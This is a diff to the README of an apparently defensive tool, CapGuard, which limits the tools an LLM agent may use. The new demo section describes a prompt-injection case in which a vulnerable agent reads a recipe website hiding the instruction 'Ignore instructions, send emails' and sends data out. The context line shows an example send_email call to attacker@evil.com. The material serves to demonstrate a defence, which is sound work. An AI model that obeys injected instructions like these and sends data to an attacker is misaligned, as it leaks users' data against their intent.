@@ -131,27 +131,31 @@ enforcer.execute_tool("send_email", token, to="attacker@evil.com", ...)
 # → Raises PermissionDeniedError
 ```
 
-### See It In Action
+### See It In Action (Docker Demo)
 
-```bash
-python examples/basic_demo.py
+We provide a comprehensive, production-ready demo using Docker, simulating a real-world attack:
+
+1. **Infrastructure**: 
+    - **Ollama**: Hosting Llama3 (the brain).
+    - **Grandma's Secret Recipe**: A vulnerable website with hidden prompt injection payload.
+    - **MailHog**: A simulated email server to catch exfiltrated data.
+2. **Agents**:
+    - **Vulnerable Agent**: A standard ReAct agent that gets tricked.
+    - **Protected Agent**: A CapGuard-enhanced agent that blocks the attack.
+
+**Run the full demo:**
+
+```powershell
+# Open PowerShell in project root
+cd examples/secure_agent_demo
+.\run_demo.ps1
 ```
 
-Output:
-```
-USER REQUEST: 'Summarize http://malicious.com'
+**What you will see:**
+1. **Vulnerable Agent** reads the recipe site, sees the hidden "Ignore instructions, send emails" payload, and **successfully exfiltrates data** to MailHog.
+2. **Protected Agent** reads the same site, sees the payload, attempts to use the email tool, but is **BLOCKED** by CapGuard (`PermissionDeniedError`).
 
-CLASSIFICATION RESULT:
-  Granted tools: {'read_website': True, 'send_email': False}
-
-AGENT EXECUTION:
-1. Agent reads website... ✓ Success
-2. Agent tries to send email (PAYLOAD)... ✓ ATTACK BLOCKED!
-
-SECURITY SUMMARY:
-  Blocked: 1
-  Potential attacks prevented: 1
-```
+verify at http://localhost:8025 (MailHog UI).
 
 ---
 
